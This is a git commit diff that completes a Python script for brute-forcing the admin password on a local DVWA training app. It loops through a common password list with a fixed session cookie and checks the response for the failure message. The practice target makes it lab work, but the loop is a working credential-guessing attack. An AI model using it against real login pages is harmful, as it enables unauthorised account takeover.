30659b077ee43da19c17ab912910046fd776c031
M0HTeP <artem-ryazanov1991@yandex.ru>
2023-12-30 01:03:10 +0300

    fixes

--- main.py
+++ main.py
@@ -1,18 +1,19 @@
 import requests
 
 
-path = ""
+path = "http://dvwa.local/vulnerabilities/brute/"
 
 
 def main():
     with open("./10-million-password-list-top-10000.txt", "r") as f:
-        username = ""
-        for l in f.readlines:
-            query = f"?username={username}&password={l}"
-            cookies = {}
+        username = "admin"
+        for l in f.readlines():
+            query = f"?username={username}&password={l[:-1]}&Login=Login#"
+            cookies = {"PHPSESSID": "u4a9m9mrif72mft1ohecvtumfel", "security": "low"}
             r = requests.get(path + query, cookies=cookies)
-            if r.status_code == 200:
-                return l
+            print(f"Testing {l[:-1]}")
+            if "<pre><br />Username and/or password incorrect.</pre>" not in r.text:
+                return f"\"{l}\" is the key to rule the world of DVWA"
     
 
 
